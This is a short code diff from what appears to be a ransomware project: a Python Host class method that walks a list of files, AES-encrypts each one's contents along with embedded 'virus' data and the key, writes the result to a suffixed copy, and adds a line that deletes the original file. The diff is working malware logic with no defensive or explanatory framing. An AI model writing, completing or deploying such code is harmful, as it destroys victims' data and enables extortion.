@@ -144,22 +144,22 @@ class Host:
         for file in self.fs_scan_list:
             with open(file, 'rb') as fin:
                 data_read = fin.read()
-                with open(file+suffix, 'w') as fout:
-                    encrypted_data = {
-                        "checksum": self.crypto.ChecksumSHA512(data_read),
-                        "fileData": self.crypto.EncodeAES(data_read),
-                        "encryptedVirus": self.crypto.EncodeAES(
-                            self.crypto.EncodeAES(
-                                time.time().hex().encode()
-                            ) + delimiter + self.crypto.EncodeAES(self.crypto.virus_data)
-                        ),
-                        "iv": self.crypto.EncodeAES(self.crypto.EncodeAES(
+                encrypted_data = {
+                    "checksum": self.crypto.ChecksumSHA512(data_read),
+                    "fileData": self.crypto.EncodeAES(data_read),
+                    "encryptedVirus": self.crypto.EncodeAES(
+                        self.crypto.EncodeAES(
                             time.time().hex().encode()
-                        ) + delimiter + self.crypto.EncodeAES(self.crypto.key))
-                    }
-                    json.dump(encrypted_data, fout, indent=2)
-                    self.locked_file_list.append(file+suffix)
-
+                        ) + delimiter + self.crypto.EncodeAES(self.crypto.virus_data)
+                    ),
+                    "iv": self.crypto.EncodeAES(self.crypto.EncodeAES(
+                        time.time().hex().encode()
+                    ) + delimiter + self.crypto.EncodeAES(self.crypto.key))
+                }
+            with open(file+suffix, 'w') as fout:
+                json.dump(encrypted_data, fout, indent=2)
+                os.remove(file)
+                self.locked_file_list.append(file+suffix)
         return self
 
     def decrypt(self, delimiter="|:|", clean_tag=".clean", infected_tag=".infected"):
